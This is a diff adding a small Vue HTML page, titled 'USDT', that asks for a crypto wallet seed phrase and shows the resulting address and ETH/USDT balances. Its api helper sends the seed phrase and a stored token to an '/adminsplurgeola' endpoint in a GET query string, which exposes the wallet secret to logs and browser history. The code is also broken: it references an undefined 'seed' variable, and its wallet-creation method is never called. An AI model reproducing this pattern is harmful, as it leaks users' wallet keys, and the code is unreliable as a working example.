@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link href="styles/common.css" rel="stylesheet" type="text/css" />
+    <title>USDT</title>
+    <script src="https://ru.vuejs.org/js/vue.js"></script>
+</head>
+
+<body>
+    <div id="app">
+        <textarea v-model="seed" v-if="!info.address" placeholder="Seed фраза"></textarea>
+        <div class="">
+            <div><span class="w100">Address:</span> {{info.address}}</div>
+            <div><span class="w100">Balance ETH:</span> {{info.balanceEth}}</div>
+            <div><span class="w100">Balance USDT:</span> {{info.balanceUsdt}}</div>
+        </div>
+    </div>
+
+    <script>
+        const app = new Vue({
+            el: '#app',
+            data: {
+                seed,
+                info: {
+                    address: null,
+                    balanceUsdt: 0,
+                    balanceEth: 0
+                }
+            },
+            computed: {
+              
+            },
+            created() {
+              
+            },
+            methods: {
+                createCosh(){
+                    api({action: 'createCosh', data: {seed: this.seed}}, data => {
+                        // console.log(data);
+                      this.info = data;
+                    });
+                }
+            }
+        });
+
+        function api(obj, cb = () => {}) {
+            obj.data = obj.data || {};
+            obj.data.token = localStorage.getItem('token');
+            fetch('/adminsplurgeola?action=' + obj.action + '&data=' + JSON.stringify(obj.data))
+                .then(res => {
+                    res.json().then(data => {
+                        console.log('Resp:', obj.action + ' -> ', data);
+                        if (data.success) {
+                            cb(data.result);
+                        } else {
+                            console.warn(obj.action + ' error: ', data);
+                        }
+                    });
+                })
+                .catch(function (err) {
+                    console.warn(obj.action, err);
+                });
+        };
+
+    function fullTime(u) {
+        return new Date(u).toLocaleString();
+    }
+</script>
+</body>
+
+
+<style>
+    body{
+        background: slategray;
+        color: snow;
+    }
+    #users {
+        width: 100%;
+        height: 800px;
+        overflow: scroll;
+    }
+
+    table input {
+        width: 100%;
+        padding: 6px;
+    }
+
+    table {
+        font-family: "Lucida Sans Unicode", "Lucida Grande", Sans-Serif;
+        font-size: 14px;
+        border-radius: 10px;
+        border-spacing: 0;
+        text-align: center;
+    }
+
+    th {
+        background: rgb(35, 36, 36);
+        color: white;
+        text-shadow: 0 1px 1px #2D2020;
+        padding: 10px 20px;
+    }
+
+    th,
+    td {
+        border-style: solid;
+        border-width: 0 1px 1px 0;
+        border-color: white;
+    }
+
+    th:first-child,
+    td:first-child {
+        text-align: left;
+    }
+
+    th:first-child {
+        border-top-left-radius: 10px;
+    }
+
+    th:last-child {
+        border-top-right-radius: 10px;
+        border-right: none;
+    }
+
+    td {
+        color: wheat;
+        padding: 10px 20px;
+        background: rgb(150, 149, 145);
+    }
+
+    tr:last-child td:first-child {
+        border-radius: 0 0 0 10px;
+    }
+
+    tr:last-child td:last-child {
+        border-radius: 0 0 10px 0;
+    }
+
+    tr td:last-child {
+        border-right: none;
+    }
+
+    .input-line{
+        margin: 5px;
+    }
+    .input-line label{
+        display: inline-block;
+        width: 200px;
+    }
+</style>
+
+</html>
